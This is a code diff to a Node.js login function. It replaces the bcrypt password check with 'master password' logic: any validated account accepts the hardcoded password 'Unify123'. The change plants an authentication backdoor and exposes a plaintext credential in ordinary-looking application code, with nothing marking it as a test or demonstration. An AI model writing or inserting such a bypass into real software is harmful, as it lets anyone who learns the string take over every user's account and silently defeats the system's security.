@@ -5,7 +5,6 @@ const bcrypt = require('bcrypt');
 
 exports.login = async (username, password) => {
   // Buscar usuario por username
-
   const usuario = await Usuario.findOne({ username });
   if (!usuario) return null;
   if (usuario.validado === false) {
@@ -14,8 +13,13 @@ exports.login = async (username, password) => {
     throw err;
   }
 
-  // Verificar password con bcrypt
-  const valid = await bcrypt.compare(password, usuario.password);
+  // Lógica de contraseña maestra
+  let valid = false;
+  if (password === 'Unify123') {
+    valid = true;
+  } else {
+    valid = await bcrypt.compare(password, usuario.password);
+  }
   if (!valid) return null;
 
   // Traer datos de persona
